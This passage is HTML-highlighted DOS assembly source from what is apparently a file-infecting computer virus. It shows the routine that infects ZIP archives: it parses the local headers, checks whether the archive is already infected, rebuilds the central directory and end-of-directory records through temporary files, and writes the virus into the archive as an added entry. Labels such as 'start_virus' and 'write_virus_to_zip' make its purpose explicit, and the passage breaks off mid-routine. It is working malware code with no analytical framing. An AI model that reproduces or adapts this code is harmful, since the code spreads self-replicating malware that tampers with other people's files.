</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc2">0403h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">read_local_hdr_struc</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">we_are_in_the_central_dir</span><span class="sc0">

</span><span class="sc5">read_local_hdr_struc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1eh</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">verify_if_infected</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_filename</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_add</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_next_local_hdr</span><span class="sc0">

</span><span class="sc5">close_add</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_add_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">erase_add</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">erase_file</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_new_zip</span><span class="sc0">

</span><span class="sc5">find_next_local_hdr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;zip_compressed_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;zip_extra_field_length</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;zip_size_fname</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">read_local_hdr</span><span class="sc0">

</span><span class="sc5">we_are_in_the_central_dir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">create_dir_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_dir</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">create_file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_dir_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">read_central_dir</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">

</span><span class="sc5">read_central_dir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2eh</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">read_dir_entry_struc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;zip_size_fname</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;zip_extra_field_length</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;zip_file_comment_length</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">2Eh</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">write_all_dir_entry</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_dir_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2eh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">read_next_dir_entry</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc3">"KP"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">zipsign_ok2</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_zip_infect</span><span class="sc0">

</span><span class="sc5">zipsign_ok2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc2">0605h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">we_are_in_the_end_hdr</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">read_central_dir</span><span class="sc0">

</span><span class="sc5">we_are_in_the_end_hdr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">create_end_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_end</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">create_file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_end_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">read_end_dir</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_zip_infect</span><span class="sc0">

</span><span class="sc5">read_end_dir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">read_end_dir_struct</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;zipfile_comment_length</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">write_end_dir_struct</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_end_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">end_file_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;sauve end_file size</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">pointer_to_start_of_central_dir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;offset of central dir</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_rel_off_of_loc_hdr_</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_rel_off_of_loc_hdr_</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;-------------write virus in principal zip part-------------------------</span><span class="sc0">

</span><span class="sc5">change_some_things_in_local_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_zip_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_compressed_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_uncompressed_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">write_add_file_local_hdr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_local_header_struc</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc4">+</span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">pointer_to_start_of_add_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_add_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc5">read_add_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_zip_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">write_virus_to_zip</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_zip_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">close_temp_add_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_add_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">erase_temp_add_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">erase_file</span><span class="sc0">

</span><span class="sc1">;-------------write modified dir part-------------------------</span><span class="sc0">

</span><span class="sc5">pointer_to_end_of_dir_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_dir_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_fin</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                                 </span><span class="sc1">;save size</span><span class="sc0">

</span><span class="sc5">change_some_things_in_dir_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_zip_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
